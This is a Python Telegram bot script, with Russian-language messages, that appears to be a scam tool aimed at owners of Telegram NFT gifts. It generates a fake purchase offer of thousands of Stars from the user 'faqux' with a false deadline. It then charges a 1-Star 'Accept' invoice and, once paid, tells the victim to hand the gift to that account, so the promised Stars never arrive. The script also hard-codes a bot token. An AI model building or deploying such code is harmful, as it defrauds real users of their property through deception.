import asyncio
import logging
import re

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery
)
from aiogram.enums import ParseMode

BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"  # вставь свой токен
current_buyer = "faqux"
DEFAULT_STARS = 7000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def parse_gift(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars = DEFAULT_STARS
    for match in re.finditer(r'\b(\d{3,7})\b', text):
        val = int(match.group(1))
        if str(val) != num and 100 <= val <= 1000000:
            stars = val
            break
    slug = f"{name}-{num}"
    return {
        "gift_name": f"{gift_name} #{num}",
        "link": f"https://t.me/nft/{slug}",
        "stars": stars
    }


@dp.message()
async def on_msg(message: Message):
    text = message.text or ""
    gift = parse_gift(text)
    if not gift:
        await message.answer("Кинь ссылку t.me/nft/... и цену")
        return

    offer_text = (
        f"<b>Пользователь {current_buyer} предлагает Вам {gift['stars']} Stars за подарок "
        f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>.</b>\n\n"
        f"Предложение действует ещё <b>5ч 59м</b>."
    )

    # Send invoice as the "Accept" action
    await message.answer("Готово. Перешли ниже.")
    await bot.send_invoice(
        chat_id=message.chat.id,
        title=f"Accept: {gift['gift_name']}",
        description=(
            f"Предложение о продаже {gift['gift_name']} успешно принято.\n\n"
            f"Передайте подарок покупателю для зачисления {gift['stars']} Stars на ваш баланс."
        ),
        payload=f"offer_{gift['gift_name']}_{gift['stars']}",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=gift["gift_name"], amount=1)],
        start_parameter="offer"
    )


@dp.pre_checkout_query()
async def pre_checkout(query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(query.id, ok=True)


@dp.message(F.successful_payment)
async def on_success(message: Message):
    await message.answer(
        "Предложение принято.\n\nПередайте подарок покупателю.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Передать", url=f"https://t.me/{current_buyer}")
        ]])
    )


async def main():
    print("Invoice bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
